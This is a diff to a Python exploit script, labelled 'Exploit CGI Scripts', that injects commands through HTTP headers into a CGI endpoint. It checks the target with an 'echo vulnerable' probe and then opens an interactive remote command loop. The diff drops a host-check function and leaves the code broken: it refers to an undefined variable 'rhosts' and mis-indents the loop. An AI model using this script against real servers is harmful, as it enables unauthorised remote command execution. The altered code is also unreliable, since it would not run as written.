@@ -28,14 +28,6 @@ def getreq(url, command):
     request = req.get(url, headers=headers)
     return request.text
 
-
-def checkhost(url):
-    request = req.get(url)
-    if request.status_code >= 400:
-        return False
-    return True
-
-
 def isvulnerable(url):
     response = getreq(url, 'echo vulnerable')
     if 'vulnerable' in response:
@@ -61,21 +53,17 @@ print("""
             Exploit CGI Scripts
         """)
 
-rhosts = input("Provide the full URL to the CGI Script (Include http://): ")
+rhost = input("Provide the full URL to the CGI Script (Include http://): ")
 try:
-    if not checkhost(rhosts):
-        print(
-            "\n\033[91mHost seems down or you don't have access to this resource.\033[0m")
-    else:
-        if isvulnerable(rhosts):
-            while True:
-                cmd = input("$ ")
-                if cmd == 'exit':
-                    break
-                elif cmd == 'clear':
-                    clearscrn()
-                resp = getreq(rhosts, cmd)
-                print(resp)
+   if isvulnerable(rhosts):
+   while True:
+      cmd = input("$ ")
+      if cmd == 'exit':
+         break
+      elif cmd == 'clear':
+         clearscrn()
+      resp = getreq(rhost, cmd)
+      print(resp)
 
 except(req.exceptions.MissingSchema, req.exceptions.ConnectionError):
     print(
